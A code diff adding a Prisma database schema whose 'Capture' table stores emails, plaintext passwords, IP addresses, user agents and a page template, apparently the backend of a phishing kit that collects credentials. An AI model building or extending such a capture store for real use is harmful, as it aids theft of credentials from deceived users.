@@ -1,0 +1,31 @@
+generator client {
+  provider = "prisma-client-py"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model Capture {
+  id        String   @id @default(cuid())
+  email     String
+  password  String
+  ip        String
+  userAgent String?
+  timestamp DateTime @default(now())
+  template  String?
+  createdAt DateTime @default(now())
+  updatedAt DateTime @updatedAt
+
+  @@map("captures")
+}
+
+model AdminSession {
+  id        String   @id @default(cuid())
+  sessionId String   @unique
+  createdAt DateTime @default(now())
+  expiresAt DateTime
+
+  @@map("admin_sessions")
+}
